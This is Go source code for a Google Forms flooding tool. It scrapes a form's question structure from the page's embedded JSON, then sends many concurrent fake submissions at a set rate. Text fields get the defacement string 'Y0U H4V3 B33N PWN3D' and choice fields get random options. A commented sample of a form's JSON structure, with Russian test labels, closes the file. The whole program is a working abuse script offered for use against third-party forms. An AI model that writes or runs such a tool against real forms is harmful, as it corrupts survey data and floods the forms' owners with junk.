package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"reflect"
	"regexp"
	"strconv"
	"strings"
	"time"
)

type Question struct {
	ID         int
	IsRequired bool
	Type       int
	Name       string
	Answers    []string
}

var baseURL string
var iter int
var delay float64

func send(questions []Question) {
	client := &http.Client{}
	postURL, _ := url.Parse(baseURL + "/formResponse")
	parameters := url.Values{}

	for _, val := range questions {
		if val.Type == 2 {
			parameters.Add("entry."+fmt.Sprint(val.ID), val.Answers[rand.Intn(len(val.Answers))])
		}
		if val.Type == 0 || val.Type == 1 {
			parameters.Add("entry."+fmt.Sprint(val.ID), "Y0U H4V3 B33N PWN3D")
		}
		if val.Type == 4 {
			randIter := rand.Intn(len(val.Answers))
			for i := 0; i <= randIter; i++ {
				parameters.Add("entry."+fmt.Sprint(val.ID), val.Answers[rand.Intn(len(val.Answers))])
			}
		}
	}
	postURL.RawQuery = parameters.Encode()
	//fmt.Println(postURL)
	req, _ := http.NewRequest("POST", postURL.String(), nil)
	req.Header.Set("Content-type", "application/x-www-form-urlencoded")
	_, err := client.Do(req)
	if err != nil {
		log.Fatalln(err)
	}
}

func main() {
	client := &http.Client{}
	//baseURL = "https://docs.google.com/forms/d/e/1FAIpQLSfkZAW5lwWkIOOUcJ29zjSr6YtGuRN6m-L2VoM_7fDesK-Uaw"
	//baseURL = "https://docs.google.com/forms/d/16ZMcU7NOGL10ElHdNZ5vDjIS3Z6sqCmDjX059WxRQAo"

	flagURL := flag.String("base-url", "", "url 4 requests")
	flagIter := flag.Int("iter", 0, "amount of iterations")
	flagDelay := flag.Float64("delay", 0.0, "delay (in milliseconds)")

	flag.Parse()

	baseURL = *flagURL
	iter = *flagIter
	delay = *flagDelay

	req, _ := http.NewRequest("GET", baseURL+"/viewform", nil)
	res, _ := client.Do(req)

	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatalln(err)
	}

	regexp := regexp.MustCompile(`FB_PUBLIC_LOAD_DATA_(.*?(\n))+.*?;`)
	rawJSON := regexp.FindStringSubmatch(string(body))[0]
	rawJSON = rawJSON[23:(len(rawJSON) - 2)]

	var results []interface{}
	if err := json.Unmarshal([]byte(rawJSON), &results); err != nil {
		panic(err)
	}

	items := reflect.ValueOf(reflect.ValueOf(results[1]).Index(1).Interface())

	var questions []Question

	for i := 0; i < items.Len(); i++ {
		tmp := reflect.ValueOf(items.Slice(i, i+1).Index(0).Interface())

		typ, err := strconv.ParseInt(strings.Trim(fmt.Sprintf("%v", tmp.Slice(3, 4)), "[]"), 10, 32)
		if err != nil {
			fmt.Println(err)
		}

		name := strings.Trim(fmt.Sprintf("%v", tmp.Slice(1, 2)), "[]")
		if err != nil {
			fmt.Println(err)
		}

		questionType := reflect.ValueOf(reflect.ValueOf(tmp.Slice(3, 4).Interface()).Index(0).Interface())

		if questionType.Float() != 6 {
			questionInfo := reflect.ValueOf(reflect.ValueOf(tmp.Slice(4, 5).Index(0).Interface()).Slice(0, 1).Index(0).Interface())

			isRequired, err := strconv.ParseBool(strings.Trim(fmt.Sprintf("%v", questionInfo.Slice(2, 3)), "[]"))
			if err != nil {
				fmt.Println(err)
			}

			str := fmt.Sprintf("%v", questionInfo.Slice(0, 1))
			str = str[1 : len(str)-5]
			str = strings.Replace(str, ".", "", 1)
			id, err := strconv.ParseInt(str, 10, 64)
			if err != nil {
				fmt.Println(err)
			}

			var answers []string
			if typ == 2 || typ == 4 {
				ans := reflect.ValueOf(questionInfo.Slice(1, 2).Index(0).Interface())
				for i := 0; i < ans.Len(); i++ {
					answer := reflect.ValueOf(ans.Slice(i, i+1).Index(0).Interface()).Index(0)
					answers = append(answers, fmt.Sprintf("%v", answer))
				}
			} else {
				answers = append(answers, "testString")
			}

			questions = append(questions, Question{int(id), isRequired, int(typ), name, answers})
		}
	}

	for _, val := range questions {
		fmt.Println(val)
	}

	for j := 0; j < iter; j++ {
		go send(questions)
		time.Sleep(time.Millisecond * time.Duration(delay))
	}

}


/* [
  null,
  [
    null,
    [
      [
        193413651,
        "Тест вопрос",
        null,
        2,
        [
          [
            576049746,
            [
              [
                "Вариант 1",
                null,
                null,
                null,
                0
              ],
              [
                "ЭТО ДРУГОЕ",
                null,
                null,
                null,
                0
              ],
              [
                "ВЫ НЕ ПОНИМАЕТЕ",
                null,
                null,
                null,
                0
              ]
            ],
            1, <- знак обязательности
            null,
            null,
            null,
            null,
            null,
            0
          ]
        ]
      ],
      [
        636859729,
        "ТЕСТ СТРОКА",
        null,
        0,
        [
          [
            1514738827,
            null,
            1 <- знак обязательности
          ]
        ]
      ],
      [
        339962994,
        "ТЕСТ ЧЕК БОКС",
        null,
        4,
        [
          [
            381242359,
            [
              [
                "Вариант 1",
                null,
                null,
                null,
                0
              ],
              [
                "Вариант 2",
                null,
                null,
                null,
                0
              ]
            ],
            0, <- знак обязательности
            null,
            null,
            null,
            null,
            null,
            0
          ]
        ]
      ],
      [
        1123556430,
        "ТЕСТ СТРОКА 2",
        null,
        0,
        [
          [
            1876777175,
            null,
            0 <- знак обязательности
          ]
        ]
      ],
      [
        212192669,
        "ТЕСТ ТЕКСТ",
        null,
        1,
        [
          [
            735694292,
            null,
            0 <- знак обязательности
          ]
        ]
      ]
    ],
    null,
    null,
    null,
    [
      0,
      0
    ],
    null,
    null,
    null,
    48,
    [
      null,
      null,
      null,
      null,
      0
    ],
    null,
    null,
    null,
    null,
    [
      2
    ]
  ],
  "/forms",
  "Новая форма",
  null,
  null,
  null,
  "",
  null,
  0,
  0,
  null,
  "",
  0,
  "e/1FAIpQLSfkZAW5lwWkIOOUcJ29zjSr6YtGuRN6m-L2VoM_7fDesK-Uaw",
  0,
  "[]",
  0,
  0
]
*/
